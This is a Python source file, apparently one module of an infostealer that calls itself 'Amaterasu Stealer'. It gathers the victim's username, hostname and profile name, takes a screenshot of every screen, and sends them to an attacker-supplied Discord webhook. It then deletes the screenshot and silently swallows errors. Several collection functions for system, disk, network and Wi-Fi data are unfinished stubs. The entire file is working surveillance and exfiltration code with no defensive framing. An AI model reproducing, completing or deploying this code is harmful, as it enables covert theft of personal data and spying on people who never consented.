import os
from PIL import ImageGrab
from discord import Embed, SyncWebhook, File
from typing import Literal


class Systeminfo(object):
    def __init__(self, webhook: str) -> None:
        self.webhook = SyncWebhook.from_url(webhook)
        self.embed = Embed(title="System Info", color=0x000000)

        self.run()

    def run(self) -> None:
        funcs = [
            self.user_data,
            self.system_data,
            self.disk_data,
            self.network_data,
            self.wifi_data,
        ]
        for func in funcs:
            self.embed.add_field(name=func()[0], value=func()[
                                 1], inline=func()[2])
        name = "screenshot.png"

        ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        ).save("screenshot.png")
        self.embed.set_image(url=f"attachment://{name}")

        try:
            self.webhook.send(
                embed=self.embed,
                file=File(f'.\\{name}', filename=name),
                username="Amaterasu Stealer",
            )
        except Exception:
            pass

        if os.path.exists(name):
            os.remove(name)

    def user_data(self) -> tuple[str, str, Literal[False]]:
        display_name = os.getenv("USERNAME")
        hostname = os.getenv("COMPUTERNAME")
        username = os.getenv("USERPROFILE").split("\\")[-1]  # type: ignore

        return (
            "User",
            f"```Name: {display_name}\nHostname: {hostname}\nUsername: {username}```",
            False
        )

    def system_data(self) -> tuple[str, str, Literal[False]]:
        """En desarrollo..."""

        return (
            "System",
            "```...```",
            False
        )

    def disk_data(self) -> tuple[str, str, Literal[False]]:
        """En desarrollo..."""

        return (
            "Disk",
            "```...```",
            False
        )

    def network_data(self) -> tuple[str, str, Literal[False]]:
        """En desarrollo..."""

        return (
            "Network",
            "```...```",
            False
        )

    def wifi_data(self) -> tuple[str, str, Literal[False]]:
        """En desarrollo..."""

        return (
            "WIFI",
            "```...```",
            False
        )
